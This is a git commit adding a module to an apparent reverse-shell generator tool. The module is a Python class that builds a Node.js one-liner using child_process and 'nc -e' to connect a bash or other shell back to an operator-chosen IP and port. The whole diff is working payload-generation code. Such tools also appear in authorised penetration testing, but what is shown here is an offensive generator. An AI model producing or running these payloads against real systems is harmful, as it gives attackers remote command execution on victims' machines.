55511d34b0024742c9bc09c213d64def2a7668a1
smith <smith.nguyenhoangthanh@gmail.com>
2021-01-07 16:10:29 +0700

    add nodejs module

---
+++ shellgen/modules/multi/nodejs.py
@@ -0,0 +1,31 @@
+from ogabog.cores import plugin, const
+
+
+class ReverseTCP(plugin.ReverseShell):
+    def __init__(self):
+        super().__init__()
+        self.add_args(
+            "--shell",
+            default="bash",
+            choices=const.LINUX_SHELL,
+            help="Select shell type on target machine"
+        )
+        self.add_args(
+            "--exec",
+            default="exec",
+            choices=[
+                "exec",
+                "execSync"
+                # "execFile",
+                # "spawn",
+                # "fork"
+            ]
+        )
+        self.opts.description = "[ReverseShell][TCP] NodeJS from swisskyrepo/PayloadsAllTheThings. License MIT."
+        self.opts.description += "\nModule author: Nguyen Hoang Thanh <smith.nguyenhoangthanh@gmail.com>"
+
+    def make_shell(self):
+        self.shell = """node -e "require('child_process').{}('nc -e {} {} {}')""".format(self.args.exec,
+                                                                                         self.args.shell, self.args.ip,
+                                                                                         self.args.port)
+        self.shell += '"'
